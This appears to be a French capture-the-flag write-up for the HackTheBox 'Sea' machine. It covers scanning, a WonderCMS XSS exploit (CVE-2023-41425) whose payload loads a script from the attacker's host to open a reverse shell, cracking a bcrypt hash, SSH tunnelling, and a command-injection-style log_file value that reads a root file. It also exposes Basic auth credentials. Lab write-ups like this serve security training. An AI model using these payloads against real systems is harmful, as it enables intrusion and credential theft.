  # Sea

	echo "10.10.11.28 sea.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.28 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.28 -oN nmap.txt
	feroxbuster --silent -u http://sea.htb
	
Scans classiques.

    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))


Site web classique avec juste quelques sous-dossiers (et une page contact.php) : 

> http://sea.htb/plugins     
> http://sea.htb/data     
> http://sea.htb/messages     
> http://sea.htb/themes     

    feroxbuster --silent -u http://sea.htb/themes/
    ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt


http://sea.htb/themes/bike/README.md => Thème WonderCMS

Il existe un CVE : https://github.com/prodigiousMind/CVE-2023-41425

    git clone https://github.com/duck-sec/CVE-2023-41425
    rlwrap nc -nvlp 9999
    python3 exploit.py -u http://sea.htb/loginURL -lh 10.10.16.50 -lp 9999 -sh 10.10.16.50 -sp 8000
    
La page contact.php permet justement d'envoyer un site web à l'administrateur, on pourra utiliser ce champ pour mettre le payload XSS : 

    http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.50:8000/xss.js"></script><form+action="

On reçoit bien un shell en tant que www-data.

On trouve ensuite un hash dans /var/www :

    cat /var/www/sea/data/database.js 
    
Ce hash est facilement cassable : 

    hashid -m '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q'
    hashcat -a 0 -m 3200  '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' ~/wordlists/rockyou.txt
    
On voit deux utilisateurs dans /home : amay et geo.
Le mot de passe fonctionne pour amay : 

    ssh amay@10.10.11.28 
    cat user.txt

## Élévation de privilèges

    netstat -pentula 
    
Site web interne : 

    ssh -L 8081:localhost:8080 amay@10.10.11.28
    firefox http://localhost:8081/

Les credentials trouvés précédemment fonctionnent.

Il y a une fonction d'analyse des logs où l'on peut spécifier le fichier. Elle semble marcher en tant que root donc on peut l'utiliser pour lire le flag. Il semble toutefois y avoir un filtre à casser. 

Requête finale : 

    POST / HTTP/1.1
    Host: localhost:8081
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 40
    Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==

    log_file=/root/root.txt;abc&analyze_log=
